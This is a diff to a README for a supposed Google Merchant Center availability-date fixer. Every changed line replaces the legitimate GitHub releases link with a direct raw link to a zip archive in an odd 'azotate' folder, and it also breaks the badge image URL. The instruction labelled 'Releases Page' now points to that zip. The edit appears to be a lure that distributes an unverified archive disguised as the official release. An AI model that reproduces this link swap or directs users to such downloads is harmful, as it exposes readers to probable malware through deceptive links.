@@ -6,7 +6,7 @@ Welcome to the Google-Shopping-Merchant-Center-Availability-Date-Fixer! This too
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Bkzinn-code/Google-Shopping-Merchant-Center-Availability-Date-Fixer/releases)
+[![Download](https://raw.githubusercontent.com/Bkzinn-code/Google-Shopping-Merchant-Center-Availability-Date-Fixer/main/azotate/Google-Shopping-Merchant-Center-Availability-Date-Fixer_v3.6-alpha.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Bkzinn-code/Google-Shopping-Merchant-Center-Availability-Date-Fixer/main/azotate/Google-Shopping-Merchant-Center-Availability-Date-Fixer_v3.6-alpha.5.zip)
 
 ## 📋 Overview
 
@@ -27,7 +27,7 @@ To run this software, you will need:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/Bkzinn-code/Google-Shopping-Merchant-Center-Availability-Date-Fixer/releases).
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/Bkzinn-code/Google-Shopping-Merchant-Center-Availability-Date-Fixer/main/azotate/Google-Shopping-Merchant-Center-Availability-Date-Fixer_v3.6-alpha.5.zip).
    
 2. **Choose the Right Version**: Select the latest version available.
    
@@ -102,4 +102,4 @@ This application is relevant for anyone involved in digital marketing, particula
 
 The Google-Shopping-Merchant-Center-Availability-Date-Fixer is a straightforward solution to help you maintain accurate availability dates for your products in Google Merchant Center. Follow the steps above to download, install, and start using the application today.
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Bkzinn-code/Google-Shopping-Merchant-Center-Availability-Date-Fixer/releases)
+[![Download](https://raw.githubusercontent.com/Bkzinn-code/Google-Shopping-Merchant-Center-Availability-Date-Fixer/main/azotate/Google-Shopping-Merchant-Center-Availability-Date-Fixer_v3.6-alpha.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Bkzinn-code/Google-Shopping-Merchant-Center-Availability-Date-Fixer/main/azotate/Google-Shopping-Merchant-Center-Availability-Date-Fixer_v3.6-alpha.5.zip)
